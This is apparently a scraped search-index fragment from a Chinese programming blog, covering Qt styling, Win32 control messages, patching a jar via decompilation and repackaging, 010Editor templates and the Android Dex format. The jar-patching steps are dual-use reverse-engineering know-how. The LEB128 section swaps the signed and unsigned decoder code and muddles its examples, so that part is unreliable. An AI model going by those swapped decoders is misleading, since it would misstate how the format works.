","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:23:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qss //声明 public slots: //设置皮肤样式 static void SetStyle(const QString\u0026 styleName); //实现 void luoQt::SetStyle(const QString\u0026 styleName) { QFile file(QString(\"./image/%1.qss\").arg(styleName)); bool b = file.open(QFile::ReadOnly); QString qss = QLatin1String(file.readAll()); qApp-\u003esetStyleSheet(qss); qApp-\u003esetPalette(QPalette(QColor(\"#F0F0F0\"))); } Qss.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:24:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt程序打包 将Qt程序单独放到一个文件夹中,cmd到该文件夹,执行下面的命令. windeployqt 程序名 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:25:0","tags":["Windows"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"消息 N(notify): 通知,通告,控件发送给使用者 M(message): 发送给控件,用于修改和控制控件的消息 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:1:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"查看控件消息 依次在MSDN中打开Platform SDK Documentation/User Interface Services/Windows User Interface/Controls ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:2:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Button case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_TEST1: MessageBox(hwndDlg, \"按钮1按下\", \"Luo\", MB_OK); break; case BUT_TEST2: { MessageBox(hwndDlg, \"按钮2按下\", \"Luo\", MB_OK); HWND hWnBut1 = GetDlgItem(hwndDlg, BUT_TEST1); SendMessage(hWnBut1, BM_CLICK, 0, 0); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:3:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Edit Control ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"支持换行 Multiline设置为true Want Return设置为true ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:1","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"获取文本 EM_GETLINE case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; HWND hWndEdit = GetDlgItem(hwndDlg, EDIT_TEST); SendMessage(hWndEdit, EM_GETLINE, 0, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } WM_GETTEXT case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; HWND hWndEdit = GetDlgItem(hwndDlg, EDIT_TEST); SendMessage(hWndEdit, WM_GETTEXT, MAXBYTE, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } SendDlgItemMessage case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; SendDlgItemMessage(hwndDlg, //对话框句柄 EDIT_TEST, //控件ID WM_GETTEXT, //消息 MAXBYTE, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } GetWindowText case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; HWND hWndEdit = GetDlgItem(hwndDlg, EDIT_TEST); GetWindowText(hWndEdit, szBuf, sizeof(szBuf)); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } GetDlgItemText case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; GetDlgItemText(hwndDlg, EDIT_TEST, szBuf, sizeof(szBuf)); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:2","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"设置文本 case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_SETTEXT: { char szBuf[] = \"XiaLuoHun\"; SetDlgItemText(hwndDlg, EDIT_TEST, szBuf); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:3","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Check Box 在MSDN中查看BUTTON消息 BM_GETCHECK: 判断复选框是否被选中 若被选中,则返回BST_CHECKED ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:5:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Radio Button 在MSDN中查看BUTTON消息 BM_GETCHECK: 判断单选框是否被选中 若被选中,则返回BST_CHECKED ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:6:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Combo Box CB_ADDSTRING: 向组合框中加内容 CB_SETCURSEL: 设置组合框默认选项 case WM_INITDIALOG: { //向组合框中加内容 SendDlgItemMessage(hwndDlg, CMB_TEST, CB_ADDSTRING, 0, (LPARAM)\"LuoHun\"); SendDlgItemMessage(hwndDlg, CMB_TEST, CB_ADDSTRING, 0, (LPARAM)\"ShiTou\"); //设置组合框默认选项 SendDlgItemMessage(hwndDlg, CMB_TEST, CB_SETCURSEL, 0, 0); return true; } CB_GETCURSEL: 获取当前组合框选中项的索引 CB_GETLBTEXT: 根据索引值,获取组合框中的文本 case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { //获取组合框中当前选中项的索引值 HWND hWndComBox = GetDlgItem(hwndDlg, CMB_TEST); int nCurIdx = SendMessage(hWndComBox, CB_GETCURSEL, 0, 0); //获取组合框选中项的文本 char szBuf[MAXBYTE] = \"0\"; SendMessage(hWndComBox, CB_GETLBTEXT, nCurIdx, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:7:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"通用控件 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:0","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"需包头文件 #include \u003ccommctrl.h\u003e #pragma comment(lib,\"comctl32.lib\") ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:1","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"响应消息 WM_NOTIFY ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:2","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"List Control 设置整行选中 //获取句柄 HWND hListCtrl = GetDlgItem(hwndDlg, EXPORT_LISTCTRL); //设置整行选中 SendMessage(hListCtrl, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_FULLROWSELECT); 插入表头 //插入表头 LV_COLUMN lv; memset(\u0026lv, 0, sizeof(lv)); //第一列 lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM; lv.pszText = TEXT(\"序号\"); lv.cx = 50; lv.iSubItem = 0; SendMessage(hListCtrl, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); //第二列 lv.pszText = TEXT(\"RVA\"); lv.cx = 80; lv.iSubItem = 1; ListView_InsertColumn(hListCtrl, 1, \u0026lv); 添加数据 LV_ITEM vitem; memset(\u0026vitem, 0, sizeof(LV_ITEM)); //插入序号 CHAR szBuf[MAXBYTE] = \"0\"; vitem.mask = LVIF_TEXT; DWORD dwOrdinalAddBase = dwOrdinal + pExportDirectory-\u003eBase; sprintf_s(szBuf, \"%04X\", dwOrdinalAddBase); vitem.pszText = szBuf; vitem.iItem = i;//行 vitem.iSubItem = 0;//列 ListView_InsertItem(hListCtrl, \u0026vitem); //插入RVA sprintf_s(szBuf, \"%08X\", dwFuncRva); vitem.pszText = szBuf; vitem.iItem = i;//行 vitem.iSubItem = 1;//列 ListView_SetItem(hListCtrl, \u0026vitem); 获取选中行信息 //获取列表控件句柄 HWND hLstCtrlSection = GetDlgItem(hwndDlg, RELOCATION_LSTCTRL_SECTION); LV_ITEM vitem; //初始化 memset(\u0026vitem, 0, sizeof(LV_ITEM)); //获取当前选中行的序号 DWORD dwIdx = SendMessage(hLstCtrlSection, LVM_GETSELECTIONMARK, 0, 0); //获取当前选中行的信息第1列信息 CHAR szBuf[MAXBYTE] = \"0\"; vitem.mask = TVIF_TEXT | TVIF_PARAM;//设置哪些成员是有效的 vitem.pszText = szBuf; vitem.cchTextMax = sizeof(szBuf); vitem.iItem = dwIdx;//选中行 vitem.iSubItem = 1;//第1列 BOOL bRet = ListView_GetItem(hLstCtrlSection, \u0026vitem); if (bRet == FALSE) { return FALSE; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:3","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Tree Control 设置风格 //获取树控件的句柄 HWND hwndTree = GetDlgItem(hwndDlg, RESOURCE_TREE); //设置树控件的风格 DWORD dwStyle = GetWindowLong(hwndTree, GWL_STYLE); dwStyle = dwStyle | TVS_HASLINES | TVS_LINESATROOT | TVS_HASBUTTONS | TVS_SHOWSELALWAYS; SetWindowLong(hwndTree, GWL_STYLE, dwStyle); 添加数据 CHAR szBuf[MAXBYTE] = \"LuoHun\";//缓冲区 HTREEITEM hFirstItem;//保存结点句柄 TVITEM tvItem = { 0 };//结点 tvItem.mask = TVIF_TEXT | TVIF_STATE | TVIF_PARAM;//设置哪些成员是有效的 tvItem.cchTextMax = sizeof(szBuf); tvItem.pszText = szBuf; tvItem.lParam = (LPARAM)pFirstResDirEntry;//附加数据 TVINSERTSTRUCT tvStruct = { 0 }; tvStruct = { 0 }; tvStruct.hParent = TVI_ROOT; tvStruct.item = tvItem; hFirstItem = TreeView_InsertItem(hwndTree, \u0026tvStruct); 获取选中结点信息 响应消息: case WM_NOTIFY: { NMHDR* pNmhdr = (NMHDR*)lParam; NMTREEVIEW* pnmtv = (LPNMTREEVIEW)lParam; if (wParam == RESOURCE_TREE \u0026\u0026 pNmhdr-\u003ecode == TVN_SELCHANGED \u0026\u0026 pnmtv-\u003eaction == TVC_BYMOUSE) { //给对话框相关控件赋值 FillResourceTableDlg(hwndDlg); } return TRUE; } FillResourceTableDlg: //获取树控件句柄 HWND hTree = GetDlgItem(hwndDlg, RESOURCE_TREE); //获取选中结点句柄 HTREEITEM hTreeItem = TreeView_GetSelection(hTree); //给tvItem赋值 CHAR szBuf[MAXBYTE] = \"0\";//缓冲区 TVITEM tvItem = { 0 };//结点 tvItem.mask = TVIF_TEXT | TVIF_PARAM ;//设置哪些成员是有效的 tvItem.hItem = hTreeItem; tvItem.pszText = szBuf; tvItem.cchTextMax = sizeof(szBuf); //tvItem是一个传入传出参数,获取选中项数据 BOOL bRet = TreeView_GetItem(hTree, \u0026tvItem); if (bRet == FALSE) { return FALSE; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:4","tags":["Windows"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["java"],"content":" 将目标jar包拷贝到IDEA工程的lib目录下,然后右键lib目录,Add as Library. 在IDEA中右键Src目录,新建一个Java类 如: 目标类: com.android.xxx.a.class 新建类: com.android.xxx.a.java 用Jeb反编译目标class文件,拷贝到新建类中. 在新建类中进行修改. IDEA编译修改后的工程,找到编译出来的.class文件. 将Jar包用压缩软件解压,用编译出来的.class文件进行替换. cd到Jar包解压文件所在目录,利用jdk bin目录中的jar进行重新打包. jar cvf XXX.jar * //XXX.jar为要打包成的jar文件名 用新生成的Jar包替换之前的Jar即可. ","date":"2021-10-01","objectID":"/posts/java/jar%E5%8C%85%E4%BF%AE%E6%94%B9/:0:0","tags":["java"],"title":"Jar包修改","uri":"/posts/java/jar%E5%8C%85%E4%BF%AE%E6%94%B9/"},{"categories":["软件相关"],"content":"帮助查询 ","date":"2021-09-25","objectID":"/posts/%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3/010editor-%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/:0:1","tags":["010Editor"],"title":"010Editor-模板编写","uri":"/posts/%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3/010editor-%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/"},{"categories":["软件相关"],"content":"示例 struct LuoHeader { int x \u003cformat=hex\u003e; //\u003cformat=hex\u003e 设置显示的进制 int y; }; Printf(\"Begin Parse\\n\"); //设置文件偏移, FSeek //FSeek(4); LuoHeader luoHeader; Printf(\"End Parse\\n\"); 010Editor导入模板后,按F5就可以解析了. ","date":"2021-09-25","objectID":"/posts/%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3/010editor-%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/:0:2","tags":["010Editor"],"title":"010Editor-模板编写","uri":"/posts/%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3/010editor-%E6%A8%A1%E6%9D%BF%E7%BC%96%E5%86%99/"},{"categories":["Android基础"],"content":"准备Dex文件 我们自己来编译一个Dex文件,供后面分析Dex文件格式. public class Hello{ public static void main(String[] args){ System.out.println(\"Hello Dex!\"); } } all: javac Hello.java d8 Hello.class install: adb push classes.dex /data/local/tmp adb shell /system/bin/dalvikvm -cp /data/local/tmp/classes.dex Hello ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:1:0","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"数据类型 http://androidxref.com/2.3.7/xref/dalvik/libdex/DexFile.h 在上述Android源码位置,定义了解析Dex文件用到的数据结构,我们先来了解下其中使用到的数据类型. 自定义类型 原类型 含义 s1 int8_t u1 uint8_t s2 int16_t u2 uint16_t s4 int32_t u4 uint32_t s8 int64_t u8 uint64_t sleb128 无 有符号LEB128,可变长度 uleb128 无 无符号LEB128,可变长度 uleb128p1 无 无符号LEB128加1,可变长度 LEB128: sleb128、uleb128、uleb128p1是Dex文件中特有的LEB128类型.在下述Android源码位置可以找到LEB128的实现. http://androidxref.com/2.3.7/xref/dalvik/libdex/Leb128.h 每个LEB128由1-5字节组成,所有字节组合在一起表示一个32位的数据.每个字节只有7位有效位,如果第1个字节的有效位为1,表示LEB128需要使用第2个字节,如果第2个字节的有效位为1,表示会使用第3个字节,依次类推,直到最后一个字节的最高位为0为止. sleb128: 读取有符号LEB128的代码如下: int readUnsignedLeb128(const u1** pStream) { const u1* ptr = *pStream; int result = *(ptr++); if (result \u003e 0x7f) { int cur = *(ptr++); result = (result \u0026 0x7f) | ((cur \u0026 0x7f) \u003c\u003c 7); if (cur \u003e 0x7f) { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 14; if (cur \u003e 0x7f) { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 21; if (cur \u003e 0x7f) { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = *(ptr++); result |= cur \u003c\u003c 28; } } } } *pStream = ptr; return result; } 从上面代码来看,先读取第一字节,判断其是否小于等于7f,如果小于等于,表示这个字节最高位为0,sleb128编码结束. 以解析0x807f为例. 0x807f对应的二进制为10000000 01111111 8位一组,首字节为0表示leb128编码结束,然后倒着将每组中的后7位重组 如本例中二进制重组为1111111 0000000这里有14位,要左移18位,然后右移18位(14 + 18 = 32)(如果有7位,就要左移25位,然后右移25位, 7 + 25 = 32), 注意最高位为符号位,右移的时候需要补1, 本例中左移18位,又右移18位后的二进制结果为1 111 1111 1111 1111 1111 1111 1000 0000 最高位是符号位,负数以补码形式存在,故取反加1后表示的真实数为-128 uleb128: 读取无符号LEB128的代码如下: int readSignedLeb128(const u1** pStream) { const u1* ptr = *pStream; int result = *(ptr++); if (result \u003c= 0x7f) { result = (result \u003c\u003c 25) \u003e\u003e 25; } else { int cur = *(ptr++); result = (result \u0026 0x7f) | ((cur \u0026 0x7f) \u003c\u003c 7); if (cur \u003c= 0x7f) { result = (result \u003c\u003c 18) \u003e\u003e 18; } else { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 14; if (cur \u003c= 0x7f) { result = (result \u003c\u003c 11) \u003e\u003e 11; } else { cur = *(ptr++); result |= (cur \u0026 0x7f) \u003c\u003c 21; if (cur \u003c= 0x7f) { result = (result \u003c\u003c 4) \u003e\u003e 4; } else { /* * Note: We don't check to see if cur is out of * range here, meaning we tolerate garbage in the * high four-order bits. */ cur = *(ptr++); result |= cur \u003c\u003c 28; } } } } *pStream = ptr; return result; } 从上面代码来看,先读取第一个字节,并判断其是否大于0x7f,如果大于的话,则代表这个字节的最高位是1,而不是0. 如果是1的话,则代表还要读下一个字节;如果是0的话,则代表uleb128编码的数值到此为止. 以0x807f解析为例: 0x807f对应的二进制为10000000 01111111 8位一组,首字节为0表示leb128编码结束,然后倒着将每组中的后7位重组 如本例中二进制重组为11 1111 1000 0000对应的16进制为0x3f80,对应的10进制就是16256 uleb128p1: 它的值为uleb128的值加1 ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:2:0","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"文件格式 ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:0","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"Dex文件结构 Dex文件整体结构如下: dex header:Dex文件头 string_ids到class_def:“索引结构区” data:真实的数据 link_data:静态链接数据区 Dex文件由DexFile结构体表示,其定义如下: typedef struct DexFile { /* directly-mapped \"opt\" header */ const DexOptHeader* pOptHeader; /* pointers to directly-mapped structs and arrays in base DEX */ const DexHeader* pHeader; const DexStringId* pStringIds; const DexTypeId* pTypeIds; const DexFieldId* pFieldIds; const DexMethodId* pMethodIds; const DexProtoId* pProtoIds; const DexClassDef* pClassDefs; const DexLink* pLinkData; /* * These are mapped out of the \"auxillary\" section, and may not be * included in the file. */ const DexClassLookup* pClassLookup; const void* pRegisterMapPool; // RegisterMapClassPool /* points to start of DEX file data */ const u1* baseAddr; /* track memory overhead for auxillary structures */ int overhead; /* additional app-specific data structures associated with the DEX */ //void* auxData; } DexFile; ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:1","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexHeader DexHeader是Dex文件的头部信息,其定义如下: typedef struct DexHeader { u1 magic[8]; //Dex版本表示 u4 checksum; //adler32检验,如果修改了Dex文件,需要修正这个值,否则会运行不起来 u1 signature[kSHA1DigestLen]; //SHA-1散列值,Android不检测这个值,但如果修改了Dex文件,最好先修下这个值,然后修checksum u4 fileSize; //整个文件的大小 u4 headerSize; //DexHeader结构的大小,固定为0x70 u4 endianTag; //字节序标记,这个字段按小尾方式读出来为0x12345678,那整个Dex文件就是小尾方式.如果按大尾方式读出来为0x12345678,那整个Dex文件就是大尾方式 u4 linkSize; //链接段大小 u4 linkOff; //链接段偏移 u4 mapOff; //DexMapList文件偏移 u4 stringIdsSize; //DexStringId个数 u4 stringIdsOff; //DexStringId文件偏移 u4 typeIdsSize; //DexTypeId个数 u4 typeIdsOff; //DexTypeId文件偏移 u4 protoIdsSize; //DexProtoId个数 u4 protoIdsOff; //DexProtoId文件偏移 u4 fieldIdsSize; //DexFieldId个数 u4 fieldIdsOff; //DexFieldId文件偏移 u4 methodIdsSize; //DexMethodId个数 u4 methodIdsOff; //DexMethodId文件偏移 u4 classDefsSize; //DexClassDef个数 u4 classDefsOff; //DexClassDef文件偏移 u4 dataSize; //数据段大小 u4 dataOff; //数据段文件偏移 } DexHeader; ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:2","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexMapList DexHeader中的mapOff字段指明了DexMapList在Dex文件中的偏移,其定义如下: typedef struct DexMapList { u4 size; //DexMapItem结构的个数 DexMapItem list[1]; //DexMapItem结构 } DexMapList; typedef struct DexMapItem { u2 type; //KDexType开头的类型 u2 unused; //未使用,用于字节对齐 u4 size; //指定类型的个数 u4 offset; //指定类型数据的文件偏移 } DexMapItem; type字段是一个枚举常量,其定义如下,通过名称很容易能判断它的具体类型. enum { kDexTypeHeaderItem = 0x0000, //DexHeader kDexTypeStringIdItem = 0x0001, //对应DexHeader中的stringIdsSize与stringIdsOff字段 kDexTypeTypeIdItem = 0x0002, //对应DexHeader中的typeIdsSize与typeIdsOff字段 kDexTypeProtoIdItem = 0x0003, //对应DexHeader中的protoIdsSize与protoIdsOff字段 kDexTypeFieldIdItem = 0x0004, //对应DexHeader中的fieldIdsSize与fieldIdsOff字段 kDexTypeMethodIdItem = 0x0005, //对应DexHeader中的methodIdsSize与methodIdsOff字段 kDexTypeClassDefItem = 0x0006, //对应DexHeader中的classDefsSize与classDefsOff字段 kDexTypeMapList = 0x1000, //指向DexMapItem结构自身 kDexTypeTypeList = 0x1001, //DexTypeList kDexTypeAnnotationSetRefList = 0x1002, kDexTypeAnnotationSetItem = 0x1003, kDexTypeClassDataItem = 0x2000, //DexClassData kDexTypeCodeItem = 0x2001, //DexCode kDexTypeStringDataItem = 0x2002, //DexStringId字符串列表的首地址 kDexTypeDebugInfoItem = 0x2003, //调试信息偏移量,与DexCode结构中debugInfoOff字段指向的内容相同 kDexTypeAnnotationItem = 0x2004, kDexTypeEncodedArrayItem = 0x2005, kDexTypeAnnotationsDirectoryItem = 0x2006, }; ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:3","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexStringId typedef struct DexStringId { u4 stringDataOff; /* file offset to string_data_item */ } DexStringId; //伪结构表示如下: struct string_data_item { uleb128 utf16_size; //字符串长度 ubyte[] data; //字符串数据 } stringDataOff指向的字符串并非普通的ASCII字符串,而是由MUTF-8编码表示的字符串.在MUTF-8字符串的头部存放的是uleb128编码的字符个数,后面才是字符串数据. 可以使用下述代码读取字符串数据. const char* dexGetStringData(const DexFile* pDexFile,const DexStringId* pStringId) { const u1* ptr = pDexFile-\u003ebaseAddr + pStringId-\u003estringDataOff; // Skip the uleb128 length. while (*(ptr++) \u003e 0x7f) /* empty */ ; return (const char*) ptr; } ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:4","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexTypeId typedef struct DexTypeId { u4 descriptorIdx; //指向DexStringId列表的索引 } DexTypeId; descriptorIdx为DexStringId列表的索引,它所对应的字符串代表了具体类的类型. ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:5","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexProtoId typedef struct DexProtoId { u4 shortyIdx; //方法声明字符串,指向DexStringId列表的索引 u4 returnTypeIdx; //方法返回类型字符串,指向DexTypeId列表的索引 u4 parametersOff; //方法的参数列表,指向DexTypeList列表的索引 } DexProtoId; typedef struct DexTypeList { u4 size; //接下来DexTypeItem结构的个数 DexTypeItem list[1]; //DexTypeItem结构 } DexTypeList; typedef struct DexTypeItem { u2 typeIdx; //指向DexTypeId列表的索引 } DexTypeItem; 方法声明由返回类型和参数列表组成,且返回类型在参数列表的前面. ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:6","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexFieldId typedef struct DexFieldId { u2 classIdx; //类的类型,指向DexTypeId列表的索引 u2 typeIdx; //字段类型,指向DexTypeId列表的索引 u4 nameIdx; //字段名,指向DexStringId列表的索引 } DexFieldId; 指明了字段所在的类、字段的类型以及字段名. ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:7","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexMethodId typedef struct DexMethodId { u2 classIdx; //类的类型,指向DexTypeId列表的索引 u2 protoIdx; //声明类型,指向DexProtoId列表的索引 u4 nameIdx; //方法名,指向DexStringId列表的索引 } DexMethodId; 指明了方法所在的类、方法的声明以及方法名. ","date":"2021-09-25","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/:3:8","tags":["Android"],"title":"Dex","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/dex/"},{"categories":["Android基础"],"content":"DexClassDef //http://androidxref.com/2.3.7/xref/dalvik/libdex/DexFile.h typedef struct DexClassDef { u4 classIdx; //类的类型,指向DexTypeId列表的索引 u4 accessFlags; //访问标志,以ACC_开头的枚举值 u4 superclassIdx; //父类的类型,指向DexTypeId列表的索引 u4 interfacesOff; //接口,如类中有接口声明或实现,则是指向DexTypeList的偏移量,否则为0 u4 sourceFileIdx; //源文件名,表示类所在源文件的名称,指向DexStringId列表的索引 u4 annotationsOff; //注解,如有,则是指向DexAnnotationsDirectoryItem列表的索引,否则为0 u4 classDataOff; //类的数据部分,指向DexClassData结构的偏移量 u4 staticValuesOff; //记录了类中的静态数据,指向DexEncodedArray结构的偏移量 } DexClassDef; //http://androidxref.com/2.3.7/xref/dalvik/libdex/DexClass.h //DexClass.h文件中所有结构的u4类型的字段其实是uleb128类型 struct 